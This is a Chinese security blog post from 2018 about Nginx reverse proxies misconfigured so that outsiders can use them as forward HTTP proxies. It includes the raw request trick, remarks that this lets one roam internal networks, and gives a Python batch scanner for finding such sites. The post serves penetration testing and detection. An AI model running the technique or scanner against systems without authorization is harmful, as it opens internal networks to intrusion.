---
layout: post
author: Vulkey_Chen
title: "刺透内网的HTTP代理"
date: 2018-09-11
music-id: 133998
permalink: /archives/2018-09-11/1
description: "刺透内网的HTTP代理"
---

# 从偶然出发

在做测试的时候发现了这样一个漏洞，原请求报文如下：

```http
GET / HTTP/1.1
Host: attack_website
[... HEADER ...]

...
```

当时最初目的是想测SSRF的，但是经过测试没发现存在漏洞后来想起之前看过的一些漏洞案例，将请求报文中的URI部分替换成了网址：

http://gh0st.cn

就变成了如下的请求：

```http
GET http://gh0st.cn HTTP/1.1
Host: attack_website
[... HEADER ...]

...
```

在BurpSuite里进行重放测试发现返回的响应正文就是 http://gh0st.cn 的，也就是说这里的attack_website可以被作为HTTP代理，于是进入下一步的测试能否使用非http/https协议进行请求？例如file:///，测试后发现确实没办法这样玩，看来是这里代理服务器不支持。

**在这里替换URI部分为内网的地址，可以直接漫游内网的系统，进行深入的渗透测试了，后续的事情就不在这多说了，那么来研究看看为什么会有这样的问题呢？**

## 从被动偶然到主动发现

### 了解原理

查阅了一番资料和询问了一下朋友，都说具体的不太清楚，后来看见这样一篇文章：

https://www.secpulse.com/archives/74676.html

其中所说原理大致是因为Nginx反向代理配置不当导致可以被作为正向代理，导致能被外部作为HTTP代理服务器。

#### 正向代理 and 反向代理

**正向代理**

- 浏览器（/全局）设置代理服务器IP和对应端口
- 浏览器输入目标地址->代理服务器->目标服务器

简而言之，正向代理类似我们经常用到的跳板机，利用代理去访问外部的资源。

![proxy](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2018-09-11/0x00.png)

**反向代理**

跟正代不同的地方在于反向代理相对浏览器来说是透明的，不需要在浏览器（/全局）做什么配置，而是有反向代理服务器自己做请求转发到其服务器上所配置的地址。

大致如下的流程：

1. 浏览器访问网站（网站所指即反向代理服务器）
2. 网站（反向代理服务器）做处理，将请求转发给所设置的目标服务器
3. 由请求最终到达的目标服务器响应给网站（反向代理服务器），然后再通过其返回给浏览器

![proxy](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2018-09-11/0x01.png)

TIPs：

- 一、反向代理服务器也可以变成WAF（例如Nginx支持反代功能，nginx+lua也可以搭建网站waf）
- 二、反向代理服务器也可以起到负载均衡的作用，由反向代理服务器做选择分配Web服务器

## 主动发现脚本开发

脚本语言选择：python2.7

系统环境：all

### 思考

如何判断这个网站存在可以作为HTTP代理访问资源？唯一特征是什么？

脑子中唯一的思路就是IP，如果这目标站点能作为HTTP代理访问资源，那么我设置的这个资源就是返回真实IP的，这样就可以判断了～

这里我在团队官网上小小的写了一个，但是在大批量去测试却无法使用，因为官网的空间没那么大的吞吐量，承载不住高并发，后期建议大家使用 http://httpbin.org/ip 这个接口～

http://www.hi-ourlife.com/getip.php

PHP代码：

```php
<?php
echo $_SERVER['REMOTE_ADDR'];
?>
```

### 代码构建

Import 库

```python
import urllib, sys, re, json
```

全局变量：

```python
poc = "http://www.hi-ourlife.com/getip.php"
```

获取使用代理访问资源后内容（IP）函数：

```python
def useProxy(site):
	try:
		res = urllib.urlopen(poc, proxies={'http': site}).read()
		return res
	except:
		return getIP()
```

正常本机获取IP函数：

```python
def getIP():
	res = urllib.urlopen(poc).read()
	return res
```

防止有些会出错返回的内容不是IP，其实返回不是IP也就间接证明不存在这种漏洞，所以需要写个正则来匹配，这时候判断是否是IP的函数就诞生了：

```python
def isIP(ip):
    compileIP = re.compile('^((25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(25[0-5]|2[0-4]\d|[01]?\d\d?)$')
    if compileIP.match(ip):
        return True
    else:
        return False
```

对比IP函数：

```python
def isVul(site):
	resA = getIP()
	#print resA
	resB = useProxy(site)
	#print resB
	if resA == resB or not isIP(resB):
		print "\033[1;33m[INFO]\033[0m No Vulnerability!"
	else:
		print "\033[1;31m[INFO]\033[0m Existing Vulnerability!"
		print "\033[1;36m[INFO]\033[0m Site:[ {0} ] -> RealIP:[ {1} ]".format(site, resB)
```

### 单线程批量

从扫描器里把代码模板剥离了出来如下：

```python
#-*- coding:utf-8 -*-
#Author: Vulkey_Chen

import urllib, sys, re

poc = "http://www.hi-ourlife.com/getip.php"

def useProxy(site):
	try:
		res = urllib.urlopen(poc, proxies={'http': site}).read()
		return res
	except:
		return getIP()

def getIP():
	res = urllib.urlopen(poc).read()
	return res

def getSite(filename):
	f = open(filename)
	res = []
	for line in f:
		res.append(line)
	return res

def isIP(ip):
    compileIP = re.compile('^((25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(25[0-5]|2[0-4]\d|[01]?\d\d?)$')
    if compileIP.match(ip):
        return True
    else:
        return False

def isVul(site):
	resA = getIP()
	#print resA
	resB = useProxy(site)
	#print resB
	if resA == resB or not isIP(resB):
		print "\033[1;33m[INFO]\033[0m No Vulnerability!"
	else:
		print "\033[1;31m[INFO]\033[0m Existing Vulnerability!"
		print "\033[1;36m[INFO]\033[0m Site:[ {0} ] -> RealIP:[ {1} ]".format(site, resB)

def main(filename):
	for i in getSite(filename):
		isVul(i.replace("\n",""))

if __name__ == '__main__':
	main(sys.argv[1])
```

![res](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2018-09-11/0x02.png)

#  END

使用方法：python proxy_vul.py urls.txt

urls.txt 格式：

```txt
http://www.hi-ourlife.com/
https://gh0st.cn/
http://mst.hi-ourlife.com:8080/
```

建议批量方法：

扫描所有想检测站点的web服务端口（Nginx容器存在此类问题居多），然后使用脚本检测。

